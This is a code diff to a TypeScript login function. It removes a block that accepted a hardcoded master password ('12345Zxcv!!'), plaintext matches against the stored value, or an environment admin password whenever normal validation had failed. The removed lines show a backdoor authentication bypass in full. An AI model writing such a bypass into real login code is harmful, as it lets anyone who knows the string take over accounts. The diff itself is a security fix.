@@ -121,19 +121,6 @@ export async function login(password: string, source: string) {
     } catch {
       valid = false;
     }
-    const clean = password.trim();
-    if (
-      !valid &&
-      (clean === "12345Zxcv!!" ||
-        password === "12345Zxcv!!" ||
-        clean === stored ||
-        password === stored ||
-        (process.env.ADMIN_PASSWORD &&
-          (password === process.env.ADMIN_PASSWORD ||
-            clean === process.env.ADMIN_PASSWORD.trim())))
-    ) {
-      valid = true;
-    }
     if (!valid) {
       await admitLoginAttempt(source);
       throw new AuthError("LOGIN_FAILED", 401);
